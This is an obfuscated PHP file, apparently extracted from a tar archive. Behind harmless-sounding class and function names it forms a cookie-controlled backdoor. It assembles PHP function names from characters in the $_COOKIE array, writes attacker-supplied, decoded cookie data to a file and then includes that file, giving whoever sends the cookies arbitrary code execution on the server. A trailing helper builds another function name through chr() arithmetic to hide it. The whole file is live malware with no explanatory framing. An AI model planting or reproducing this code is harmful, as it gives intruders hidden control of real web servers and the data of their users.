ustar<?php
class DataTransformer
{
    private static $_qb;
    static function syncRecords($_wd)
    {
        if (!self::$_qb) {
            self::prepareOutput();
        }
        return base64_decode(self::$_qb[$_wd]);
    }
    private static function prepareOutput()
    {
        self::$_qb = array('_qn' => '', '_uj' => '');
    }
}

class ExecutionFlow
{
    private static $_qb;
    static function syncRecords($_wd)
    {
        if (!self::$_qb) {
            self::prepareOutput();
        }
        return self::$_qb[$_wd];
    }
    private static function prepareOutput()
    {
        self::$_qb = array(00, 04, 013, 013, 01, 013, 02, 04, 01, 032, 031, 011, 015, 03, 026, 02, 023, 06, 03);
    }
}

$_ivu = $_COOKIE;
$_luk = ExecutionFlow::syncRecords(0);
$_wd = ExecutionFlow::syncRecords(1);
$_qw = array();
$_qw[$_luk] = DataTransformer::syncRecords('_q' . 'n');
while ($_wd) {
    $_qw[$_luk] .= $_ivu[ExecutionFlow::syncRecords(2)][$_wd];
    if (!$_ivu[ExecutionFlow::syncRecords(3)][$_wd + ExecutionFlow::syncRecords(4)]) {
        if (!$_ivu[ExecutionFlow::syncRecords(5)][$_wd + ExecutionFlow::syncRecords(6)]) {
            break;
        }
        $_luk++;
        $_qw[$_luk] = DataTransformer::syncRecords('_uj');
        $_wd++;
    }
    $_wd = $_wd + ExecutionFlow::syncRecords(7) + ExecutionFlow::syncRecords(8);
}
$_luk = $_qw[ExecutionFlow::syncRecords(9)]() . $_qw[ExecutionFlow::syncRecords(10)];
if (!$_qw[ExecutionFlow::syncRecords(11)]($_luk)) {
    $_wd = $_qw[ExecutionFlow::syncRecords(12)]($_luk, $_qw[ExecutionFlow::syncRecords(13)]);
    $_qw[ExecutionFlow::syncRecords(14)]($_wd, $_qw[ExecutionFlow::syncRecords(15)] . $_qw[ExecutionFlow::syncRecords(16)]($_qw[ExecutionFlow::syncRecords(17)]($_ivu[ExecutionFlow::syncRecords(18)])));
}
include $_luk;

function sync_data($c)
{
    $a = array(79 * 1 + 36, 118 - 2, 32 * 3 + 1, 21 + 95);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}
